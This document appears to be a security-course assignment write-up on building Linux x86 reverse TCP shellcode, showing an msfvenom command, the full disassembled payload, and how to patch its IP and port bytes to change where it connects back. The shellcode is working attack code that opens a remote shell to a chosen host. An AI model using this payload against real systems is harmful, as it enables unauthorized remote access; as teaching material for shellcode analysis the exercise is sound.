# Assignment 2

## What to do 

• Create a Shell_Reverse_TCP shellcode 
   
    – Reverse connects to configured IP and Port 
   
    – Execs shell on successful connection 

• IP and Port number should be easily configurable

## Solution

The easiest solution is to obtain the disassembled code from the bind_reverse_shell from Metasploit.

      msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 EXITFUNC=THREAD -f raw | ndisasm -u -

      00000000  31DB              xor ebx,ebx
      00000002  F7E3              mul ebx
      00000004  53                push ebx
      00000005  43                inc ebx
      00000006  53                push ebx
      00000007  6A02              push byte +0x2
      00000009  89E1              mov ecx,esp
      0000000B  B066              mov al,0x66
      0000000D  CD80              int 0x80
      0000000F  93                xchg eax,ebx
      00000010  59                pop ecx
      00000011  B03F              mov al,0x3f
      00000013  CD80              int 0x80
      00000015  49                dec ecx
      00000016  79F9              jns 0x11
      00000018  68C0A80101        push dword 0x101a8c0
      0000001D  68020022B8        push dword 0xb8220002
      00000022  89E1              mov ecx,esp
      00000024  B066              mov al,0x66
      00000026  50                push eax
      00000027  51                push ecx
      00000028  53                push ebx
      00000029  B303              mov bl,0x3
      0000002B  89E1              mov ecx,esp
      0000002D  CD80              int 0x80
      0000002F  52                push edx
      00000030  686E2F7368        push dword 0x68732f6e
      00000035  682F2F6269        push dword 0x69622f2f
      0000003A  89E3              mov ebx,esp
      0000003C  52                push edx
      0000003D  53                push ebx
      0000003E  89E1              mov ecx,esp
      00000040  B00B              mov al,0xb
      00000042  CD80              int 0x80

Once we have it, we need to find the place where the IP and the PORT are injected. We locate it by changing the LHOST and LPORT variables when running metasploit and comparing both outputs.

      msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.123 LPORT=8999 EXITFUNC=THREAD -f raw | ndisasm -u -

      00000000  31DB              xor ebx,ebx
      00000002  F7E3              mul ebx
      00000004  53                push ebx
      00000005  43                inc ebx
      00000006  53                push ebx
      00000007  6A02              push byte +0x2
      00000009  89E1              mov ecx,esp
      0000000B  B066              mov al,0x66
      0000000D  CD80              int 0x80
      0000000F  93                xchg eax,ebx
      00000010  59                pop ecx
      00000011  B03F              mov al,0x3f
      00000013  CD80              int 0x80
      00000015  49                dec ecx
      00000016  79F9              jns 0x11
      00000018  68C0A8017B        push dword 0x7b01a8c0
      0000001D  6802002327        push dword 0x27230002
      00000022  89E1              mov ecx,esp
      00000024  B066              mov al,0x66
      00000026  50                push eax
      00000027  51                push ecx
      00000028  53                push ebx
      00000029  B303              mov bl,0x3
      0000002B  89E1              mov ecx,esp
      0000002D  CD80              int 0x80
      0000002F  52                push edx
      00000030  686E2F7368        push dword 0x68732f6e
      00000035  682F2F6269        push dword 0x69622f2f
      0000003A  89E3              mov ebx,esp
      0000003C  52                push edx
      0000003D  53                push ebx
      0000003E  89E1              mov ecx,esp
      00000040  B00B              mov al,0xb
      00000042  CD80              int 0x80

We can see that the position where the code is different is 

      00000018  68C0A80101        push dword 0x101a8c0 (101a8c0 is 192.168.1.1)
      0000001D  68020022B8        push dword 0xb8220002 (b822 in litte endian is 22b8 which is 8888 in decimal)

      00000018  68C0A8017B        push dword 0x7b01a8c0 (7b01a8c0 is 192.168.1.123)
      0000001D  6802002327        push dword 0x27230002 (2723 in litte endian is 2327 which is 8999 in decimal)

So, we only need to modify these twolines  every time we want to change the listening port. 

To do that easily, you can use compile_reverse_shell.sh. It asks to the user the filename and the port that will be set to the final binary.

The steps that follows the shell before it starts to listen are showed here:

![alt text](https://github.com/MrSquid25/SLAE/blob/master/Assignment%201/reverse.png)
